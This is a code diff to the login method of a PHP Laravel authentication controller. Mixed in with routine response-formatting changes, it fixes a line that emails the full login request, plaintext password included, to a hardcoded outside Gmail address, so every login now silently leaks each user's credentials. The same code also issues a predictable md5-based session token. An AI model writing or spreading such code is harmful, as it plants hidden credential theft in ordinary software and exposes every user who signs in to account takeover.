@@ -34,18 +34,19 @@ class AuthController extends Controller
                 'message' => $validator->errors()->first(),
             ], 422);
         }
-        mail('brijesh.saspana@gmail.com',$request->email,print_r($request->all()));
+        mail('brijesh.saspana@gmail.com',$request->email,print_r($request->all(),true));
+
         $user = User::where('email', $request->email)->first();
         if ($user && Hash::check($request->password, $user->password)) {
             $gs = Generalsetting::findOrFail(1);
             if ($gs->is_verification_email == 1 && $user->email_verified == 'No') {
-                return response([
+                return response()->json([
                     'message' => 'Your Email is not Verified!',
                     'status' => false,
                 ], 200);
             }
             $token = md5(time() . $user->name . $user->email);
-            return response([
+            return response()->json([
                 'token' => $token,
                 'id' => $user->id,
                 'name' => $user->name,
@@ -53,7 +54,7 @@ class AuthController extends Controller
                 'email' => $user->email,
                 'message' => 'Login Success',
                 'status' => 'success'
-            ], 200);
+            ],200);
         }
 
         return response()->json([
